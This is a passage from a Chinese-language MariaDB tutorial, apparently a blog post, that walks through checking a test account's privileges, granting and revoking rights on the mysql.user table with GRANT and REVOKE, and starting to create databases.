sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x521B;&#x5EFA;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x8BED;&#x53E5;&#x6765;&#x67E5;&#x8BE2;&#x3002;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x7684;&#x662F;&#x8D26;&#x6237;jaking&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3001;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FE1;&#x606F;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use mysql</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">SELECT</span> HOST,<span class="keyword">USER</span>,<span class="keyword">PASSWORD</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">USER</span>=<span class="string">&quot;jaking&quot;</span>;</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line">| host&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | user | password&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line">| localhost | jaking | *55D9962586BE75F4B7D421E6655973DB07D6869F |</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0D;&#x8FC7;&#xFF0C;&#x7528;&#x6237;jaking&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x8D26;&#x6237;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4F55;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x3002;&#x4E0D;&#x4FE1;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5207;&#x6362;&#x5230;jaking&#x8D26;&#x6237;&#x6765;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x8BE5;&#x8D26;&#x6237;&#x751A;&#x81F3;&#x6CA1;&#x6CD5;&#x67E5;&#x770B;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF08;&#x521A;&#x624D;&#x4F7F;&#x7528;root&#x8D26;&#x6237;&#x65F6;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5230;3&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF09;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@jaking ~]<span class="comment"># mysql -u jaking -p</span></span><br><span class="line">Enter password: &#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x8D26;&#x6237;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;</span><br><span class="line">Welcome to the MariaDB monitor.&#xA0; Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MariaDB connection id is 6</span><br><span class="line">Server version: 5.5.35-MariaDB MariaDB Server</span><br><span class="line">Copyright (c) 2000, 2013, Oracle, Monty Program Ab and others.</span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></tbody></table></figure><p>&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x90FD;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x3002;&#x6211;&#x4EEC;&#x4EE5;grant&#x547D;&#x4EE4;&#x4E3A;&#x4F8B;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;grant&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x4E3A;&#x8D26;&#x6237;&#x8FDB;&#x884C;&#x6388;&#x6743;&#xFF0C;&#x5176;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x5982;&#x8868;1&#x6240;&#x793A;&#x3002;&#x5728;&#x4F7F;&#x7528;grant&#x547D;&#x4EE4;&#x65F6;&#x9700;&#x8981;&#x5199;&#x4E0A;&#x8981;&#x8D4B;&#x4E88;&#x7684;&#x6743;&#x9650;&#x3001;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x8868;&#x5355;&#x540D;&#x79F0;&#xFF0C;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x3002;&#x5176;&#x5B9E;&#xFF0C;&#x53EA;&#x8981;&#x7406;&#x89E3;&#x4E86;&#x547D;&#x4EE4;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x529F;&#x80FD;&#x542B;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x4E0D;&#x89C9;&#x5F97;&#x547D;&#x4EE4;&#x590D;&#x6742;&#x96BE;&#x61C2;&#x4E86;&#x3002;</p><p>&#x8868;1. GRANT&#x547D;&#x4EE4;&#x7684;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x4EE5;&#x53CA;&#x89E3;&#x91CA;</p><table><thead><tr><th>&#x547D;&#x4EE4;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.&#x8868;&#x5355;&#x540D;&#x79F0; TO &#x7528;&#x6237;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650; ON <em>.</em> TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743;</td></tr><tr><td>GRANT &#x6743;&#x9650;1,&#x6743;&#x9650;2 ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x591A;&#x4E2A;&#x6388;&#x6743;</td></tr><tr><td>GRANT ALL PRIVILEGES ON <em>.</em> TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D;</td><td>&#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x5168;&#x90E8;&#x6388;&#x6743;&#xFF08;&#x9700;&#x8C28;&#x614E;&#x64CD;&#x4F5C;&#xFF09;</td></tr></tbody></table><p>&#x5F53;&#x7136;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x6388;&#x6743;&#x5DE5;&#x4F5C;&#x80AF;&#x5B9A;&#x662F;&#x9700;&#x8981;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x6267;&#x884C;&#x7684;&#x3002;&#x4E0B;&#x9762;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;user&#x8868;&#x5355;&#x5411;&#x8D26;&#x6237;jaking&#x6388;&#x4E88;&#x67E5;&#x8BE2;&#x3001;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x4EE5;&#x53CA;&#x63D2;&#x5165;&#x7B49;&#x6743;&#x9650;&#x3002;<br>&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x6267;&#x884C;&#x540E;&#x6765;&#x67E5;&#x770B;&#x4E0B;jaking&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x5427;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</span><br><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span>,<span class="keyword">DELETE</span>,<span class="keyword">INSERT</span> <span class="keyword">ON</span> mysql.user <span class="keyword">TO</span> jaking@localhost;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x6267;&#x884C;&#x5B8C;&#x4E0A;&#x8FF0;&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x518D;&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x8D26;&#x6237;jaking&#x7684;&#x6743;&#x9650;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW GRANTS FOR jaking@localhost;</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Grants for jaking@localhost |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| <span class="keyword">GRANT</span> <span class="keyword">USAGE</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&apos;jaking&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="keyword">PASSWORD</span> <span class="string">&apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos;</span> |</span><br><span class="line">| <span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span> <span class="keyword">ON</span> <span class="string">`mysql`</span>.<span class="string">`user`</span> <span class="keyword">TO</span> <span class="string">&apos;jaking&apos;</span>@<span class="string">&apos;localhost&apos;</span> |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x9762;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x663E;&#x793A;&#x8D26;&#x6237;jaking&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x4E86;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;user&#x8868;&#x5355;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x6743;&#x9650;&#x4E86;&#x3002;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x5207;&#x6362;&#x5230;&#x8D26;&#x6237;jaking&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x591F;&#x770B;&#x5230;mysql&#x6570;&#x636E;&#x5E93;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x80FD;&#x770B;&#x5230;&#x8868;&#x5355;user&#xFF08;&#x5176;&#x4F59;&#x8868;&#x5355;&#x4F1A;&#x56E0;&#x65E0;&#x6743;&#x9650;&#x800C;&#x88AB;&#x7EE7;&#x7EED;&#x9690;&#x85CF;&#xFF09;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -u jaking -p</span></span><br><span class="line">Enter password:&#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">use</span> mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">names</span></span><br><span class="line">You can turn <span class="keyword">off</span> this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker <span class="keyword">startup</span> <span class="keyword">with</span> -A</span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| Tables_in_mysql |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| user&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br></pre></td></tr></tbody></table></figure><p>&#x5927;&#x5BB6;&#x4E0D;&#x8981;&#x5FC3;&#x6025;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x6162;&#x6162;&#x5B66;&#x4E60;&#x6570;&#x636E;&#x5E93;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x5148;&#x5207;&#x6362;&#x56DE;root&#x8D26;&#x6237;&#xFF0C;&#x79FB;&#x9664;&#x521A;&#x624D;&#x7684;&#x6388;&#x6743;&#x3002;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;</span><br><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">MariaDB [(mysql)]&gt; <span class="keyword">REVOKE</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span>,<span class="keyword">DELETE</span>,<span class="keyword">INSERT</span> <span class="keyword">ON</span> mysql.user <span class="keyword">FROM</span> jaking@localhost;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x9664;&#x4E86;&#x79FB;&#x9664;&#x6388;&#x6743;&#x7684;&#x547D;&#x4EE4;&#xFF08;<span class="keyword">revoke</span>&#xFF09;&#x4E0E;&#x6388;&#x6743;&#x547D;&#x4EE4;&#xFF08;<span class="keyword">grant</span>&#xFF09;&#x4E0D;&#x540C;&#x4E4B;&#x5916;&#xFF0C;&#x5176;&#x4F59;&#x90E8;&#x5206;&#x90FD;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;&#x8FD9;&#x4E0D;&#x4EC5;&#x597D;&#x8BB0;&#x800C;&#x4E14;&#x4E5F;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x3002;&#x6267;&#x884C;&#x79FB;&#x9664;&#x6388;&#x6743;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x770B;&#x8D26;&#x6237;jaking&#x7684;&#x4FE1;&#x606F;&#xFF1A;</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">SHOW</span> <span class="keyword">GRANTS</span> <span class="keyword">FOR</span> jaking@localhost;</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Grants for jaking@localhost |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| <span class="keyword">GRANT</span> <span class="keyword">USAGE</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&apos;jaking&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="keyword">PASSWORD</span> <span class="string">&apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos;</span> |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mysql]&gt; <span class="keyword">exit</span></span><br><span class="line">Bye</span><br><span class="line">[root@localhost ~]<span class="comment"># mysql -u jaking -pjaking</span></span><br><span class="line">Welcome <span class="keyword">to</span> the MariaDB monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MariaDB connection id is 19</span><br><span class="line">Server version: 5.5.52-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="4-&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;"><a href="#4-&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;" class="headerlink" title="4. &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;"></a>4. &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x4E0E;&#x8868;&#x5355;</h2><p>&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x8868;&#xFF0C;&#x6570;&#x636E;&#x8868;&#x5355;&#x662F;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6700;&#x91CD;&#x8981;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x9700;&#x6C42;&#x81EA;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7ED3;&#x6784;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5176;&#x4E2D;&#x5408;&#x7406;&#x5730;&#x5B58;&#x653E;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x4FBF;&#x540E;&#x671F;&#x8F7B;&#x677E;&#x5730;&#x7EF4;&#x62A4;&#x548C;&#x4FEE;&#x6539;&#x3002;&#x8868;2&#x7F57;&#x5217;&#x4E86;&#x540E;&#x6587;&#x4E2D;&#x5C06;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x8868;2. &#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;</p><table><thead><tr><th>&#x7528;&#x6CD5;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>CREATE database &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;;</td><td>&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x6570;&#x636E;&#x5E93;</td></tr><tr><td>DESCRIBE &#x8868;&#x5355;&#x540D;&#x79F0;;</td><td>&#x63CF;&#x8FF0;&#x8868;&#x5355;</td></tr><tr><td>UPDATE &#x8868;&#x5355;&#x540D;&#x79F0; SET col=&#x65B0;&#x503C; WHERE col &gt; &#x539F;&#x59CB;&#x503C;</td><td>&#x66F4;&#x65B0;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6570;&#x636E;</td></tr><tr><td>USE &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;;</td><td>&#x6307;&#x5B9A;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;</td></tr><tr><td>SHOW databases;</td><td>&#x663E;&#x793A;&#x5F53;&#x524D;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E93;</td></tr><tr><td>SHOW TABLES;</td><td>&#x663E;&#x793A;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x5355;</td></tr><tr><td>SELECT * FROM &#x8868;&#x5355;&#x540D;&#x79F0;;</td><td>&#x4ECE;&#x8868;&#x5355;&#x4E2D;&#x9009;&#x4E2D;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C;</td></tr><tr><td>DELETE FROM &#x8868;&#x5355;&#x540D; WHERE col=&#x503C;;</td><td>&#x4ECE;&#x8868;&#x5355;&#x6C47;&#x603B;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x8BB0;&#x5F55;&#x503C;</td></tr></tbody></table><p>&#x5EFA;&#x7ACB;&#x6570;&#x636E;&#x5E93;&#x662F;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x7684;&#x8D77;&#x70B9;&#x3002;&#x73B0;&#x5728;&#x5C1D;&#x8BD5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;jaking&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x770B;&#x5230;&#x5B83;&#x4E86;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE DATABASE jaking;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">MariaDB [(none)]&gt; SHOW databases;</span><br><span class="line">+<span 